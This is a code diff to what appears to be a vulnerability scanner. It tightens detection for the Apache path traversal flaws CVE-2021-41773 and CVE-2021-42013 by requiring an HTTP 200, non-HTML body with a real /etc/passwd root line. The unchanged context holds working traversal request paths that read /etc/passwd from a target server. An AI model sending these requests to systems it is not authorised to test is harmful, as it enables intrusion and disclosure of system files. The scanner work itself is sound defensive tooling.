@@ -225,6 +225,45 @@ def _baseline_filter(status: Optional[int], body: Optional[str]) -> tuple[Option
     return status, body
 
 
+# Classic /etc/passwd line: root:<hash>:<uid>:<gid>:…
+_PASSWD_ROOT_LINE = re.compile(r"(?m)^root:[^:\n]*:\d+:\d+:")
+
+
+def _http_status_and_body(raw: Optional[str]) -> tuple[Optional[int], str]:
+    """Split a raw HTTP response into (status, body). Missing framing → (None, "")."""
+    if not raw:
+        return None, ""
+    normalized = raw.replace("\r\n", "\n").replace("\r", "\n")
+    head, sep, body = normalized.partition("\n\n")
+    if not sep:
+        return None, ""
+    status = None
+    first = head.split("\n", 1)[0]
+    parts = first.split(None, 2)
+    if len(parts) >= 2 and parts[0].startswith("HTTP/") and parts[1].isdigit():
+        status = int(parts[1])
+    return status, body
+
+
+def _looks_like_html(body: str) -> bool:
+    cl = (body or "").lstrip()[:200].lower()
+    return cl.startswith("<!doctype html") or cl.startswith("<html") or "<head" in cl or "<body" in cl
+
+
+def _retrieved_etc_passwd(raw: Optional[str]) -> bool:
+    """True only when the response is HTTP 200 with a raw /etc/passwd body.
+
+    ``_raw_http`` does not apply the SPA/CDN baseline filter, so a 404 tutorial
+    page (or catch-all HTML) that quotes a passwd example used to confirm
+    CVE-2021-41773 / CVE-2021-42013 as CRITICAL. Require a 200, reject HTML,
+    and match a real passwd ``root:…:uid:gid:`` line in the body only.
+    """
+    status, body = _http_status_and_body(raw)
+    if status != 200 or not body or _looks_like_html(body):
+        return False
+    return _PASSWD_ROOT_LINE.search(body) is not None
+
+
 # ─── CVE-Specific Probes ─────────────────────────────────────────────────────
 
 def probe_apache_path_traversal(host: str, port: int, scheme: str = "http",
@@ -237,7 +276,7 @@ def probe_apache_path_traversal(host: str, port: int, scheme: str = "http",
     path1 = "/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"
     req1 = (f"GET {path1} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n").encode()
     resp1 = _raw_http(host, port, req1, timeout=timeout)
-    if resp1 and "root:" in resp1 and ("/bin/" in resp1 or "nologin" in resp1 or "daemon:" in resp1):
+    if _retrieved_etc_passwd(resp1):
         return CVEProbe(
             cve_id="CVE-2021-41773",
             title="Apache 2.4.49 Path Traversal — /etc/passwd Retrieved",
@@ -253,7 +292,7 @@ def probe_apache_path_traversal(host: str, port: int, scheme: str = "http",
     path2 = "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd"
     req2 = (f"GET {path2} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n").encode()
     resp2 = _raw_http(host, port, req2, timeout=timeout)
-    if resp2 and "root:" in resp2 and ("/bin/" in resp2 or "nologin" in resp2):
+    if _retrieved_etc_passwd(resp2):
         return CVEProbe(
             cve_id="CVE-2021-42013",
             title="Apache 2.4.50 Path Traversal (Double Encoding)",
